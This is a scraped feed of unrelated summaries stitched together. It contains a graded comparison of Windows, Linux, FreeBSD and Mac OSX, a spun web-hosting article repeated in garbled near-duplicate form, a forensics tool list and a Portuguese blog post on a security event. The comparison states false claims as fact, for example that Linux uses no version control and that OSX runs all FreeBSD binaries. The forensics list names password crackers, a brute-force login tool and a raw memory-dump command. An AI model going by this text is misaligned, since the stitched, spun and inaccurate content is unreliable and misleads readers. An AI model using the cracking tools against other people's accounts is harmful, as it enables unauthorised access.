for FreeBSD. It includes thousands of software packages and an extensive  ports collection, all with complete source code. Many people consider  the FreeBSD Ports Collection to be the most accessible and easiest to  use library of free software packages available anywhere. In fact,  Gentoo Linux, NetBSD, OpenBSD, and many other operating systems have  borrowed and extended the famous Ports Collection. Grade: A  Mac OSX: Borrowing from it's unix background again, OSX runs all FreeBSD binaries  and can tap into port collections modified especially for Mac OSX.  Basically, it leaves the dirty work to open-source (lolz). Grade: A   8. Development Environment  Windows: Very few development tools are included with Windows. Most need to be  purchased separately, and are rarely compatible with each other. Vista  tried to introduce a "Powershell" but it introduced more security  vulnerabilities and not much of a development environment. Grade: F  Linux: Linux includes a large array of development tools, with compilers and  interpreters for every common programming language, all the GNU  programs, including the powerful GNU C/C++ Compiler, Emacs editor, and  GDB debugger. Unfortunately, due to the very splintered nature of Linux,  applications that you compile on one system (Red Hat) may not work on  another Linux system (Slackware). This is why it's simpler to create a  makefile and configure file, and let the user compile it own his/her  own. Alternatively, the developer can compile it as deb for debain based  distros and rpm for red hat based distros; That will cover a lot of the  general linux population, the rest are more than likely skilled enough  to compile a program (which isn't difficult by the way - you just have  to run the right file) Grade: B+  FreeBSD: FreeBSD includes an extensive collection of developer tools. You get a  complete C/C++ development system (editor, compiler, debugger, profiler,  etc.) and powerful Unix development tools for Java, HTTP, Perl, Python,  TCL/TK, Awk, Sed, etc. All of these are free, and are included in the  basic FreeBSD installation. All come with full source code. Grade: A  Mac OSX: Since OSX is unix-based, the usual goodies tag along. Goodies like the  C/C++ compiler, vi, emacs, sed, HTTP, Perl etc. Some stuff you might  have to get yourself, but it's not hard to do. Grade: A   9. Development Infrastructure  Windows: Microsoft Windows is a closed-source operating system driven by  market demand rather than technical merit. New technologies are rushed  into the product before they have been properly designed or fully  implemented. Very little is known about the internal development  infrastructure of Microsoft but the "blue-screen of death" speaks for  itself. In simpler words, the next security patch, or new version, and  release cycle, is all decided by a business-minded bureaucrat who's  looking for the biggest profit margin. The development team is a  small-knit community of programmers who don't have enough time or  resources to patch holes caused by the previous development team's  incompetence or rather powerlessness. Grade: F  Linux: Linux is a Unix-like kernel that must be combined with the GNU system to  make a complete operating system. Linux does not use any version  control system so all bug-fixes and enhancements must be emailed back  and forth on mailing lists and ultimately submitted to the one person  (Linus) who has authority to commit the code to the tree. Due to the  overwhelming amount of code that gets written, it is impossible for one  person to adequately quality control all of the pending changes. For  this reason there is a lot of code in Linux that was hastily written and  would never have been accepted into a more conservative operating  system. This is where the distro concept come in. The kernel is at the  heart of the system but developers can combine it with their own mix of  software to create a "flavor" like ubuntu is a different flavor than  opensuse. And in this way there are hundreds of "flavors" each with  their own development infrastructure which usually tends to resemble  that of FreeBSD. Grade: B  FreeBSD: FreeBSD is an advanced BSD Unix operating system. The source code for  the entire system is available in a centralized source code repository  running under CVS. A large team (300+) of senior developers has write  access to this repository and they coordinate development by reviewing  and committing the best changes of the development community at large.  FreeBSD is engineered to find elegant solutions for overall goals,  rather than quick hacks to add new functionality. Since FreeBSD is a  complete open-source operating system, rather than just a kernel, you  can recompile and reinstall the entire system by simply typing one  command, "make world". Cool eh? Grade: A  Mac OSX: Now this is also a closed source operating system with a development  infrastructure similar to windows. But it's links with it's unix  counterparts allow for better development resources for the dev team to  work with. Grade: E   10. Support  Windows: Although support is available for Windows, you should be prepared to  spend as long as an hour on hold, with no guarantee that your problem  will be resolved. Because of the closed source nature of Windows,  there is no informal, free support available, and bugs can only be  fixed on Microsoft's schedule, not yours. Windows is not updated  frequently, you may wait years for bugs to be fixed. Grade: D-  Linux: Many organizations provide professional support for Linux. All the major  Linux vendors offer some level of support, and several offer full 24x7  service. There are many forums where Linux questions are answered for  free, such as newsgroups and mailing lists. As a last resort, you can  always use the source to track down and fix a problem yourself. Now,  that's what support should look like. Grade: A  FreeBSD: Several organizations, including the FreeBSD Mall, offer a wide range of  support options. In addition to 24x7 professional support, there is a  large amount of free, informal support available through Usenet  newsgroups and mailing lists, such as questions@freebsd.org. Once a  problem is found, source code patches are often available within a few  hours. Another point I should better include is that there is a FreeBSD  Handbook available, which covers pretty much everything anyone would  need. No other operating system has such a thing, oh and did I mention  it's free? Grade: A  Mac OSX: Macintosh is usually pretty good about support but then again, due to  the closed-source nature there is little informal support. Now, the  reason I said little here and none with windows, is that Mac OSX is not entirely closed source and the unix foundation is open-source and that can be used to solve a lot of problems. Grade: D   11. Price and TCO (Total Cost of Ownership)  Windows: The server edition of Windows XP costs nearly $700. Don't even get me  started on W7 and Vista. Even basic applications cost extra. Users often  spend many thousands of dollars for programs that are included for free  with Linux or FreeBSD. Documentation is expensive, and very little  on-line documentation is provided. A license is required for every  computer, which means delays and administrative overhead. The initial  learning curve for simple administration tasks is smaller than with  Unix, (which can be explained by more people having experience with  windows, it being so popular) but it also requires a lot more work to  keep the system running with any significant work load. Therefore, be  prepared to cough up some dough, both at the start and for maintenance. Grade: F  Linux: Linux is free. Several companies offer commercial aggregations at very  low cost. Applications and documentation is available for little or no  cost. There are no licensing restrictions, so Linux can be installed on  as many systems as you like for no additional cost. Linux's total cost  of ownership is very low or none, depending on what you go for. Grade: A  FreeBSD: FreeBSD can be downloaded from the Internet for free. Or it can be  purchased on a four CDROM set along with several gigabytes of  applications for $40. All necessary documentation is included. Support  is available for free or for very low cost. There is no user licensing,  so you can quickly bring additional computers online. This all adds up  to a very low (or zero) total cost of ownership. Grade: A  Mac OSX: Most people complain that OSX is more expensive to get than a windows  computer. The down payment should not be the only thing taken into  consideration. Windows has high system requirements, for which you need  to get more of some sort of hardware, and you end up buying a new  computer often. Then you have costs for anti-virus and stuff like that  (that is pretty obsolete for unix-users) and then maintenance fees  incurred. So even though the price of equivalent apple equipment may  seem slightly higher, in the long run the Total Cost of Ownership turns  out to be quite less than with windows, all depending on the  configuration, of course. Grade: E   12. User Interface and Ease of Use  Windows: Windows has pretty much used the same UI for over 10 years, adding  tweaks here and there to make it seem "new, and improved" whereas the  truth is the UI isn't very savvy when you compare it with the unix  alternatives. As far as ease of use, windows is not actually easy to  work in, and if you use it, your desktop is probably cluttered with  icons. You need to perform more actions to do the same thing that you  could do with less clicks in a unix-environment. The way the navigation  is arranged is pretty sloppy once you use something like GNOME. In a  recent study with elderly people who had never used a computer before,  more found GNOME and the OSX DE to be more easy to use than either the  WINDOWS DE or KDE. The myth that windows is easy to use only stems from  the large number of people who use it or have to use it, and that makes  them familiar with the environment. Grade: D+  Linux: Most distros, by default come with an intuitive UI such as GNOME, and  there are many many more available such as KDE, fluxbox, enlightenment,  openbox, IceWM, XFCE, etc. The interface is extremely easy to use, and  there are distributions which deal with migrating windows users and give  them a familiar environment whilst transitioning them into new ones.  Although, for people absolutely new to computers I would recommend  GNOME. Grade: A  FreeBSD: Like some distros of linux (eg. Arch). FreeBSD dumps you into the  command-line by default (Unless you configure X during setup). This is  'delicious' to users who prefer the command line, but for people who  only know wich button to click to get to their email, this is over their  head. In such a situation PC-BSD or desktop-bsd can intervene giving a  graphical installer and a GUI by default. Again, all open source DE's  and WM's are available for BSD. Grad]]></summary>

Amongst other factors, like expense and functions, youll want to decide which server youll require: Windows (NT, 2000 or XP) or Unix  (Linux, FreeBSD, OpenBSD, etc.). Both have their merits, so the 1st point you should think about when creating this choice is if you are seeking for stability, or ease of use.  UNIX based servers are generally superior in the website up-time and stability places than Windows systems. However, whilst they require to be rebooted more usually, Windows servers are normally less complicated to administer and use. A lot of beginners to net hosting will be confused more than the pros and cons of the distinct operating systems. Whilst, Unix is a lot more stable and secure it utilizes a command line interface for administration. This interface, which is like the original MS-DOS interface, can be hard to recognize to an internet site newbie. Also, in order to hold an UNIX machine stable, 1 need to update the kernel and software program regularly, an approach which is far more challenging than Windows.  This even so, can be created just as easy to do if your internet host has very good administration software. One more issue to consider when selecting which operating method to use is no matter whether you will be making use of scripting. If so what sort? For instance, if you will be employing a dynamic website, and make a decision that you want to go Perl as your language of decision then UNIX really should be your operating system of choice. This is also accurate for languages such as PHP, and Pythlon. On the other hand, if you choose to go for an ASP based website then you ought to select Windows. Nevertheless, to complicate the matter additional some UNIX systems can run ASP scripts, although the top quality of the script execution can be lesser. Bare in mind that if you select a Windows-based net server (this does not apply to hosting accounts as the host really should take care of it for you) you will require to update the software program with patches from Microsoft’s web website virtually weekly to avoid your website from being exploited. UNIX administrators will only have to do so monthly or so as UNIX is much more secure by nature, and requirements fewer patches and software updates. Unix operating systems are usually the preferred operating technique, even so, in the end, if you do every little thing appropriately, an UNIX hosted net site and a Windows hosted web website will function somewhat equally, and both must make you content. Be confident to maintain operating costs and maintained in mind when generating your decision and you won’t regret it. To know more about it, please go to: entrust ssl certificate]]></summary>

  <summary><![CDATA[So youve decided to develop a site?  The most apparent factor that you need is of course web hosting. Amongst other things, like cost and characteristics, youll need to choose which server youll want: Windows (NT, 2000 or XP) or Unix  (Linux, FreeBSD, OpenBSD, and so on.). 
Each have their merits, so the very first thing you must feel about when generating this selection is if you are hunting for stability, or ease of use.  UNIX based servers are usually superior in the web site up-time and stability areas than Windows systems. Nevertheless, even though they want to be rebooted a lot more often, Windows servers are usually simpler to administer and use. 
Numerous beginners to web hosting will be confused more than the pros and cons of the different operating systems. Although, Unix is far more stable and secure it makes use of a command line interface for administration. This interface, which is like the original MS-DOS interface, can be difficult to comprehend to a web site newbie. Also, in order to keep an UNIX machine stable, a single ought to update the kernel and computer software frequently, a process which is more tough than Windows.  This however, can be made just as simple to do if your net host has good administration software program. 
Another point to think about when deciding on which operating technique to use is whether or not you will be employing scripting. If so what kind? For example, if you will be using a dynamic web site, and decide that you want to go Perl as your language of option then UNIX should be your operating program of selection. This is also correct for languages such as PHP, and Pythlon. On the other hand, if you select to go for an ASP based internet site then you must pick Windows. Even so, to complicate the matter further some UNIX systems can run ASP scripts, even though the good quality of the script execution can be lesser. 
Bare in thoughts that if you decide on a Windows-based web server (this does not apply to hosting accounts as the host should take care of it for you) you will want to update the computer software with patches from Microsoft’s internet internet site practically weekly to prevent your internet site from becoming exploited. UNIX administrators will only have to do so monthly or so as UNIX is a lot more secure by nature, and wants fewer patches and software program updates. 
Unix operating systems are typically the preferred operating system, nevertheless, in the end, if you do almost everything correctly, an UNIX hosted web web site and a Windows hosted internet web site will function somewhat equally, and both really should make you happy. Be sure to hold operating expenses and maintained in thoughts when producing your choice and you will not regret it.

  <title><![CDATA[Data acquisition, imaging and forensics tools]]></title>
  <summary><![CDATA[Data acquisition, imaging and forensics tools and utilities The Sleuth Kit and  Autopsy Browser.   Both are open source  digital investigation tools (a.k.a digital forensic tools)  that run on Unix systems (such as  Linux,  OS X,  FreeBSD,  OpenBSD,  and Solaris).   They can be used to analyze NTFS, FAT, Ext2, Ext3, UFS1, and UFS2 file  systems and several volume system types. The Sleuth Kit (TSK) is a  collection of command line tools based on The Coroner's Toolkit (TCT).   Autopsy is a graphical interface to TSK.The Coroner's Toolkit (TCT) is a forensics toolkit for analysis of UNIX break-ins. It runs on BSD  (OpenBSD, FreeBSD, BSD/OS), Solaris/SunOS, Linux and HP-UX.WinHex: Computer Forensics & Data Recovery Software, Hex Editor & Disk Editor.dcfldd is an enhanced version of GNU dd with features useful for forensics and security. GNU ddrescue is a data recovery tool. It copies data from one file or block device  trying to rescue data in case of read errors. It's a better alternative  to using dd_rescue and dd_rhelp or SpinRite (you can just do a disk refresh with dd: "dd if=/dev/disk of=/dev/disk  bs=2m" while the drive isn't mounted - no write operations going on - or  something along those lines in order to prevent presently recoverable  read errors from progressing into unrecoverable read errors).Sysinternals tools contains programs like streams that help us find data hidden  inside alternate streams or strings that grep readable strings from a  file. It also has tools like process explorer, procmon, autoruns and  rootkit revealer that allow you to dig deep into the Windows operating  system to process, disk and data related information.Microsoft Log Parser is a powerful, versatile tool that you can use to extract information  from files of almost any format by using Structured Query Language to  text-based data such as log files, XML files and CSV files, as well as  key data sources on the Windows  operating system such as the Event Log,  the Registry, the file system, and Active Directory.AccessData Forensic Products: FTK - Forensic Toolkit, Registry Viewier - more neat tools from AccessData. Commercial products.Clonezilla is used to clone many computers simultaneously. It can perform a full  disk image or just file backup. It's a backup tool, but it can also  perform bit by bit disk imaging.Sysinternals LiveKD is a Live version of Windows Debugger (WinDBG) that allows you to run  the Kd and Windbg Microsoft kernel debuggers, which are part of the  Debugging Tools for Windows package, locally on a live system. This  means that you to easily take a memory dump of a running Windows system (.dump /f YOURUSBDISK:\fullmemorydump.dmp). On UNIX systems you can use dd to take a snapshot of the system memory ("dd if=/dev/kmem of=/path/to/memorydump").Paraben's Device Seizure - Cell Phone and PDA Forensic software. Specialized software for portable device forensics.PDD is a forensic analysis tool for Palm OS platform devices. It is an open  source Windows-based tool for Palm OS memory imaging and forensic  acquisition. The Palm OS Console Mode is used to acquire memory card  information and to create a bit-for-bit image of the selected memory  region. No data is modified on the target device and the data retrieval  is not detectable by the user of the PDA.CDInfo is an application that will display all ISO descriptors from all  attached cd-rom drives (Label, System, Application, VolumeSet,  Copyright, Creation Date, Directory Start, Directory Length, extentions,  tracks, etc).PMDump is a Windows tool that lets you dump the memory contents (both RAM and  swap) of a process to a file without stopping the process.      Virtualization: Once the actual machine is cloned, it's usually put inside a virtual  machine (features like snapshots and debugging help quite a bit with the  digital forensics process). This is called physical to virtual (P2V)  migration.   Live View is a Java-based graphical forensics tool that creates a  VMware virtual  machine out of a raw (dd-style) disk image or physical  disk. This  allows the forensic examiner to "boot up" the image or disk  and gain an  interactive, user-level perspective of the environment, all  without  modifying the underlying image or disk. Because all changes  made to the  disk are written to a separate file, the examiner can instantly  revert  all of his or her changes back to the original pristine state of the   disk. The end result is that one need not create extra "throw away"  copies  of the disk or image to create the virtual machine.VMware Converter Starter is a free p2v (physical to virtual) migration tool. VMware Converter  quickly converts Microsoft Windows based physical machines and third  party image formats to VMware virtual machines. It also converts virtual  machines between VMware platforms. Note: for digital forensic images,  you should use LiveView, and not the converter.VMware Server allows for free virtualization. You can use it in combination with Live  View to virtualize existing environments, and use the snapshots feature  to revert back to a previous state of a virtual machine in an instant.QEmu - a much more flexible virtualization program, albeit a bit slower than  VMware. Supports emulating IA-32 (x86) PCs, AMD64 PCs, MIPS R4000,  Sun's SPARC sun4m, Sun's SPARC sun4u, ARM development boards  (Integrator/CP and Versatile/PB), SH4 SHIX board, PowerPC (PReP and  Power Macintosh), and ETRAX CRIS architectures. Also, qemu-img can be a valuable tool for converting virtual machine images. Also  allows for some really low level debugging features. A modified version  of QEmu can even emulate PIX platforms (or Juniper JunOS systems like  Olive).VirtualBox  is a GPL licensed x86 virtualization platform that runs on Windows,  Linux and MacOS hosts, and supports various x86 client machines  (Windows, Linux, BSD, Solaris). It's a noteworthy alternative to using  VMware, as performance tends to be pretty good.Microsoft VirtualServer / Virtual PC are free virtualization products from Microsoft. They support all major  features (snapshots, mounting ISO images and such), and performance  tends to be reasonable (to some extent, similar to that of VMware). SIMH is a highly portable, multi-system simulator. It can emulate VAX and PDP-11 platforms. Just in case you need to perform forensics on older minicomputers.Hercules is an open source (QPL licensed) emulator of IBM Mainframe computers (System/370, ESA/390 architectures and even the 64-bit zSeries). Hercules runs under Linux, Windows (98, NT, 2000, and XP), FreeBSD, and Mac OS X (10.3 and later). Hercules will run OS/360, DOS/360, DOS/VS, MVS, VM/370, TSS/370 - all IBM public domain operating system, as well as OS/390, z/OS, VSE/ESA, z/VSE, VM/ESA, and  z/VM, and even Linux/390 and Linux (SuSE, RHEL, Debian, CentOS and  Slackware) on zSeries.Oracle VM is a server virtualization software based on Xen and Oracle Linux (itself based on RHEL sources) that fully supports both Oracle and  non-Oracle applications. It is a free alternative to VMware Virtual  Infrastructure (VMware ESX + VirtualCenter). It is certified to run the  Linux operating system, Oracle Database, Fusion Middleware, and  Application software, thus makes a very good platform for investigating  Oracle databases.The Palm OS Emulator is a program based on the Copilot app that emulates the hardware of the  various models of Palm-powered handhelds, making it a valuable tool for  writing, testing, and debugging applications as well as obtainiwinng  evidence from the device.Microsoft Windows CE 5.0 Device Emulator contains the emulator technologies featured in Windows CE 5.0. By using  the Device Emulator, you can run emulated-based images created by  Windows CE 5.0 without installing Platform Builder, its platform  development tool.  Password recovery tools: You may often need to recover keys and passwords.  "This text has been encrypted twice... for double protection!"Ophcrack is a very efficient Windows password cracker based on rainbow tables.  It will crack huge tables of LM hashes in under 3 minutes. It also comes  in the form of a LiveCD (though in digital forensics cases it's usually  best to extract the SAM file containing the password hashes from the  disk image and use that. Ophcrack can be a lot more effective if you  have more complete rainbow tables.LCP is a free alternative to the now dead L0phtcrack.John the Ripper is a very versatile password cracking tool. It's supported on different  architectures and operating systems (UNIX, Windows, OpenVMS, etc) and  it's quite fast. Besides several crypt(3) password hash types most  commonly found on various Unix flavors, supported out of the box are  Kerberos AFS and Windows NT/2000/XP/2003 LM hashes, plus several more  with contributed patches.Medusa is a very fast parallel brute force login password cracker.Elcomsoft Password Recovery suite: anything from office, archives, pdf files etc. to email clients. These are commercial products though.CmosPwd decrypts password stored in CMOS used to access BIOS SETUP. Works on a  lot of BIOSes (AMI, Award, Phoenix, IBM, etc). It can also be used to  backup, restore or erase the BIOS.AccessData Decryption Tools:  PRTK - Password Recovery Toolkit, DNA - Distributed Network Attack,  PORT - Portable Office Rainbow Tables are some of the best and fastest  tools in the business.Offline NT Password and Registry editor - a utility to (re)set the password of any user that has a valid  (local) account on your NT system. You do not need to know the old  password to set a new one. Features a registry editor. Supports 32 and  64 versions of Vista (and NTFSv5).Elcomsoft Distributed Password Recovery is designed for distributed recovery of forgotten or lost passwords of  different documents. Version 2.0 adds support for Windows SYSKEY startup  passwords, passwords stored in Domain Cached Credentials, includes  updated Adobe Acrobat module, and provides hardware acceleration (now up  to 25 times faster!) for NTLM password recovery using GeForce 8 video  cards.Dialupass - Dialup Password Recovery - Recovers the passwords of dialup entries  (VPN and Internet connections) on Windows systems. NirSoft provides a  couple of free password recovery tools for various products such as Instant Messaging applications, cached  passwords stored by Internet Browsers, E-mail clients and so on.Here's a little cool trick for recovering cached passwords (asterisk passwords) stored in your Internet Browser (Firefox, Opera, Internet Explorer or anything with JavaScript).  Steganalysis and stenography: how to detect hidden data using stenography. Stegdetect finds hidden information in JPEG images using such steganography  schemes as F5, Invisible Secrets, JPHide, and JSteg. XSteg is a GUI.Stego Suite is a powerful commercial Stenography detection toolkit, consisting of 3 major tools.Stegkit is an Automated Steganalysis Tool.Digital Invisible Ink Toolkit is an open-source cross-platform image steganography suite that includes both steganography and steganalysis implementations.StegSpy will detect steganography and the program used to hide the message.SteGUI is a StegHide GUI.Digital Watermarking allows you to hide copywrite information and such in media (images and  such) that's present even after encoding to another format  (bmp->jpg), printing, copy/paste, etc. You can use ImageMagick of various Photoshop plugins to do this.Stepic is a Python module and command line tool for hiding arbitrary data  within images by slightly modifying the colors. These modifications are  generally imperceptible to humans, but are machine detectable.wbStego4 offers steganography in bitmaps, text files, HTML files and PDF files.  It is has two very user-friendly interfaces and is ideal for securely  transmitting data online or adding copyright information, especially  with the copyright information manager.NL Stego is a system for text generation and text-based steganography. It  combines Markov Models of several orders to generate random text  resembling a given training text (or text corpus). It can also embed  secret messages into pseudo-random generated text. Steghide is an Open Source (GPL) steganography program that is able to hide data  in various kinds of image- and audio-files. The color- respectivly  sample-frequencies are not changed thus making the embedding resistant  against first-order statistical tests. Supports compression of embedded  data, encryption of embedded data, embedding of a checksum to verify the  integrity of the extraced data and has support for JPEG, BMP, WAV and  AU files.StegFS is an Open Source (GPL) Steganographic File System for Linux. Not only  does it encrypt data, it also hides it such that it cannot be proved to  be there. Filesystem tools: Data Recovery. Undelete Plus is a free deleted file recovery tool that works for all versions of  Windows (95-Vista), FAT12/16/32, NTFS and NTFS5 filesystems and can  perform recovery on various solid state devices.Avira UnErase Personal - a freely available unerase product.TestDisk is a free (GPL) data recovery software that can fix partition tables,  recover deleted partitions and rebuild NTFS boot sectors. It can find  lost partitions (anything from BSD disklabels to IBM JFS, it supports  pretty much anything).GNU Parted is a program for creating, destroying, resizing, checking, and copying  partitions, and the file systems on them. This is useful for creating  space for new operating systems, reorganising hard disk usage, copying  data between hard disks, and disk imaging. It can also be used to  attempt recovery of the partition table similar to TestDisk (rescue  START END).Stellar Phoenix has various UNIX and *NIX (SCO OpenServer, Unixware, Sun Solaris, *BSD,  HP-UX, MacOS) data recovery tools as well as some Windows Data Recovery  tools. They are, however, commercial products.R-Studio is a data recovery software suite that can recover files from  FAT(12-32), NTFS, NTFS 5, HFS/HFS+, FFS, UFS/UFS2 (*BSD, Solaris),  Ext2/Ext3 (Linux) and so on. This is a commercial product.DiskInternals NTFS Recovery is a fully automatic utility that recovers data from damaged or formatted disks. This is a commercial product.SystemRescueCD is a Linux system on a bootable CD/DVD for repairing your system and  your data after a crash. It also aims to provide an easy way to carry  out admin tasks on your computer, such as creating and editing the  partitions of the hard disk. It contains a lot of system utilities  (parted, partimage, fstools) and basic ones (editors, midnight  commander, network tools). The kernel of the system supports most  important file systems (ext2/ext3, reiserfs, reiser4, xfs, jfs, vfat,  ntfs, iso9660), and network ones (SMB/CIFS and NFS).PhotoRec is file data recovery software designed to recover lost files including  video, documents and archives from Hard Disks and CDRom and lost  pictures (thus, its 'Photo Recovery' name) from digital camera memory.  PhotoRec ignores the filesystem and goes after the underlying data, so  it will still work even if your media's filesystem has been severely  damaged or re-formatted.Datarescue PhotoRescue Advanced is picture and photo data recovery solution made by the creators of IDA Pro. PhotoRescue will undelete, unerase and recover pictures and files lost on corrupted, erased or damaged compact flash (CF) cards, SD Cards, Memory Sticks, SmartMedia and XD cards even when  other solutions fail. Once the data is recovered, it guarantees its  integrity. It supports recovery of all file types and is optimized for  JPG, TIFF, GIF and BMP, as well as most camera RAW formats: CR2, RAW,  RAF, CRW, NEF, ORF, MRW, etc and many types of movie files. In some  cases, we can even rebuild pictures that have suffered minor corruptions.MiTeC Windows Registry Recovery - crashed machine registry configuration data recovery. Cryptography tools: Once  the data has been collected, disks and media has been imaged, it now  needs to be encrypted, hashed and digitally signed in order to be  properly stored. Truecrypt is a powerful open source encryption software that works on Windows  (2000, 2003, XP, Vista) and Linux. It can do on the fly encryption, it  can encrypt whole partitions or mass storage devices, it supports  stenography (hidden volumes within an encrypted partition) for plausible  deniability and supports AES-256, Serpent and Twofish encryption. It  can also escrow keys (so you can't access the data without say the two  USB sticks with the keys and the passphrase), and supports both password  and key authentication. Note: when you're using encryption, you should  also use encrypted swap or make sure you zero it out when you're done.Cryptsetup-luks is an interface is based on the original cryptsetup utility and retains  full compatibility, but adds extra commands to deal with the Linux  Unified Key Setup (LUKS) on-disk format. This format provides additional  features such as key management and key strengthening, and remembers  encrypted volume configuration across reboots The Linux Unified Key  Setup (LUKS) - Under Windows, LUKS encrypted disks can be used with FreeOTFE (a free, open source, "on-the-fly" transparent disk encryption program for PCs and PDAs).FreeBSD GELI - cryptographic GEOM class available as of FreeBSD 6.0. The geli utility is different to gbde; it offers different features and uses a different scheme for doing cryptographic work.NetBSD CGD - cryptographic device driver provides functionality which allows you  to use disks or partitions for encrypted storage. After providing the  appropriate key, the encrypted partition is accessible using cgd  pseudo-devices.OpenBSD vnconfig(8) - provides encrypted svnd's via the "vnconfig -K rounds" options  associates an encryption key with the device. All data will be encrypted  using the Blowfish  cipher before it is written to the disk. The user is asked for both a  passphrase and the name of a salt file. OpenBSD also provides encrypted  swap by default.OpenPGP - Open Pretty Good Privacy provides data integrity services for messages and data files by using digital signatures, encryption, compression and Radix-64 conversion. In addition, OpenPGP provides key management and certificate services. The  GNU Privacy Guard (GnuPG)  is the OpenPGP implementation of the GNU  project.  GnuPG is fully OpenPGP compliant, supports most of the optional  features  and provides some extra features. GnuPG is used as the  standard encryption and  signing tool of all GNU/Linux distributions.    Intrusion Detection and vulnerability scanners: Sometimes  you need to analyze live systems during the incident. A crime has not  yet been committed, or the perpetrator is still active. Intrusion  detection, network monitoring and security auditing tools. Tools like  AIDE, Tripwire, BART and such would need to be installed and configured  before the incident occurs, but in case they are, it's good to know how  to extract the right information from the hash database and figure out  what files have changed and such.  Sometimes something as simple as a simple vulnerability scan using tools like nmap, Nessus and such may reveal us ways on how a perpetrator might have gained illegal access to a system.   AIDE - Advanced Intrusion Detection Environment is an open source intrusion  detection system similar to TripWire. It maintains a database of files  and hashes (md5,sha1,rmd160,tiger,haval,etc) that are used to check the  integrity of a file.Wireshark - Network protocol analyzer for Windows and Unix that allows  examination of data from a live network, or from a capture file on disk.  Also known as Ethereal (before the name change). Alternatives include tcpdump (most UNIX systems), snoop(1M) (Solaris) and Windows Network Monitor on Windows. Helps detect data theft or covert channels used to leak out information.Tiger is a security tool that can be use both as a security audit and  intrusion detection system. It supports multiple UNIX platforms. Unlike  other tools, Tiger needs only of POSIX tools and is written entirely in  shell language.Lynis is an auditing tool for Unix (specialists). It scans the system  configuration and creates an overview of information usable by  professional auditors.Rootkit Hunter scans for rootkits, backdoors and local exploits by running various  tests. On Windows, you would use Sysinternals "autoruns" and "Rootkit  Revealer".Microsoft Baseline Security Analyzer (MBSA) is used to detect common security misconfiguration and missing  security updates on your computer systems as well as to ensure the  system conforms to a baseline security level.BART (Basic Audit Reporting Tool) and BSM (Basic Security Module) are auditing tools used on Solaris.Bastille is a hardening tool that can maintain logs and audits a forensics expert sh]]></summary>

  <summary><![CDATA[Data Recovery on a Formatted Drive with TestDisk by Britec.co.uk TestDisk & PhotoRec Download: www.cgsecurity.org TestDisk is a powerful free data recovery software! It was primarily designed to help recover lost partitions and/or make non-booting disks bootable again when these symptoms are caused by faulty software, certain types of viruses or human error (such as accidentally deleting a Partition Table). Partition table recovery using TestDisk is really easy. TestDisk can * Fix partition table, recover deleted partition * Recover FAT32 boot sector from its backup * Rebuild FAT12/FAT16/FAT32 boot sector * Fix FAT tables * Rebuild NTFS boot sector * Recover NTFS boot sector from its backup * Fix MFT using MFT mirror * Locate ext2/ext3 Backup SuperBlock * Undelete files from FAT, NTFS and ext2 filesystem * Copy files from deleted FAT, NTFS and ext2/ext3 partitions. TestDisk has features for both novices and experts. For those who know little or nothing about data recovery techniques, TestDisk can be used to collect detailed information about a non-booting drive which can then be sent to a tech for further analysis. Those more familiar with such procedures should find TestDisk a handy tool in performing onsite recovery. Operating systems TestDisk can run under * DOS (either real or in a Windows 9x DOS-box), * Windows (NT4, 2000, XP, 2003, Vista, 2008, Windows 7), * Linux, * FreeBSD, NetBSD, OpenBSD, * SunOS and * MacOS X Source files and precompiled binary executables are ...

  <title><![CDATA[II Encontro Tecland: sucesso total!]]></title>
  <summary><![CDATA[No sábado passado, dia 13/10, Chapecó e região foram brindadas com um ótimo evento focado em Segurança da Informação. O II Encontro TecLand, organizado pelo Álisson Bertochi e hospedado pela Uceff (representada pelo Prof. Velcir Barcarolli), manteve um alto nível técnico nas suas palestras e teve também um público expressivo para a região. Quem foi, certamente aproveitou.  Eu participei com uma palestra sobre os mecanismos de segurança que o OpenBSD (meu segundo SO favorito, o primeiro sendo o Fedora) implementa por default, apresentando alguns deles na prática, e explicando como este conjunto de medidas aplicadas em todo o sistema o torna, possivelmente, o Sistema Operacional Unix-like e livre mais seguro que temos disponível atualmente. Como fui representando o OeSC-Livre, obviamente aproveitei para estrear a bandeira do grupo, que estendi logo na entrada do evento. :)  O Álisson iniciou o evento já abordando um tema complexo e interessante, falando sobre como funciona o underground da computação, sobre crackers, bankers, defacers, packet kiddies e outros elementos bizarros deste submundo. Foi bem interessante e "visceral" (nota-se pelo título da palestra), falando e demonstrando aquilo que às vezes nem sabemos que existe, mas que pode nos afetar diariamente no uso da Internet e outras tecnologias.  Eu infelizmente perdi a segunda palestra, do Éderson, sobre programação segura com PHP (algo que até me impressiona que possa ser feito, hehehe). Logo depois que ele começou a falar, saímos da sala para algumas rápidas entrevistas para um canal de TV local, TV Sul Brasil, que passa no canal 20 da NET. Não vi a matéria, pois não sou mais cliente da NET, porém acho que teremos acesso ao vídeo que foi ao ar em breve. Se achá-lo eu linko por aqui. Minha sogra viu a notícia no jornal das 22h ontem de noite e me disse que falei bem, então pelo menos sei que passou. :)  Depois do almoço o colega Jackson Laskoski nos apresentou muito bem o pfSense, um sistema de Unified Threat Management baseado em FreeBSD, não apenas falando porém demonstrando as suas características, configurações e operações, com o pfSense rodando em uma VM do seu laptop. Foi muito legal perceber a quantidade de funcionalidades que o sistema tem já out of the box, tudo integrado e fácil de gerenciar. Tenho certeza que os clientes do Jack estão bem seguros e tranquilos com essa solução rodando em seus firewalls e routers.  Então veio a palestra mais fuçadora e instigante (rolou um assembly divertido), do Gabriel Negreira Barbosa, falando sobre análises de malwares para Windows, suas técnicas para se esconder na máquina e não ser detectados e analisados, e demonstrando uma grande análise que ele e seu time fizeram, trabalhando para a Qualys, da prevalência de cada uma das técnicas (são dezenas) nos mais de 4 milhões de malwares analisados (números impressionantes!).  A essas alturas eu finalmente já tinha teminado meus slides, e depois do coffee-break terminei o evento com a minha palestra sobre os mecanismos de segurança do OpenBSD. Enquanto o pessoal não voltava do coffee, deixei rolando no sistema de som do auditório um álbum muito bom do 8bitpeoples, pra já ir sintonizando o pessoal nos bits que iríamos escovar mais tarde. Demonstrei na prática conceitos como stack smashing protection (usando um código simples que demonstra um buffer overflow), uso de números aleatórios em vários pontos do sistema, e também a atual implementação extrema de Address Space Layout Randomization, usando uma VM com um snapshot recente de OpenBSD para a arquitetura amd64. Foi muito legal, e o pessoal acompanhou interessado até o fim.  Aí no final do evento, depois de tanta conversa interessante, ainda fomos agraciados com vários brindes da Uceff (entre outros, um vinho e uma cuia lindaça) e do TecLand (uma pendrive "chave de nissan" e uma caneca "camaleoa", que muda de cor de acordo com a temperatura). A caneca já se tornou a minha preferida para tomar chá e café). Realmente um sábado memorável! Muito obrigado, Álisson, pela organização e execução perfeitas do evento, e muito obrigado, Prof. Velcir e Uceff, 